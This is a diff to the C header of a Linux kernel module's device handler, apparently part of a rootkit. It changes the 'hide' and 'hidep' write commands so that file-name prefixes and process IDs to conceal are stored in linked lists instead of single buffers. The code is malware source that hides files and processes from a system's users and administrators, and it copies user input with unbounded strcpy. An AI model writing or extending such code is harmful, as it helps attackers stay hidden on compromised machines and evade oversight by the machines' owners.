@@ -1,17 +1,15 @@
 #ifndef DEVICE_HANDLER
     #define DEVICE_HANDLER
 
-#include <linux/miscdevice.h> // dev
-#include <linux/sched.h>
-#include <linux/fs.h>
-#include <linux/uaccess.h> // copy to/from user space
-
+    #include <linux/miscdevice.h> // dev
+    #include <linux/sched.h>
+    #include <linux/fs.h>
+    #include <linux/uaccess.h> // copy to/from user space
+    #include "linked_list.h"
 
 
 #define DEVICE_SIZE 512 // size of possible input in bytes
 char last_data[DEVICE_SIZE] = "no data has been written yet"; // last written data from userspace
-char PREFIX[DEVICE_SIZE] = "asdfasdfasdfasdfasdf"; // filename prefix to hide
-char hide_pid[NAME_MAX]; // pid to hide
 
 
 ssize_t reader(struct file *filep, char *buff, size_t count, loff_t *offp)
@@ -34,13 +32,13 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     if(memcmp("hide ", tmpdata, strlen("hide ")) == 0){
         if(strlen(tmpdata) > strlen("hide ") + 3){
             strcpy(last_data, tmpdata + strlen("hide "));
-            strcpy(PREFIX, last_data);
+            insert_node(&files_to_hide, last_data);
         }
     }
     if(memcmp("hidep ", tmpdata, strlen("hidep ")) == 0){
         if(strlen(tmpdata) > strlen("hidep ")){
             strcpy(last_data, tmpdata + strlen("hidep "));
-            strcpy(hide_pid, last_data);
+            insert_node(&pids_to_hide, last_data);
         }
     }
     return 0;
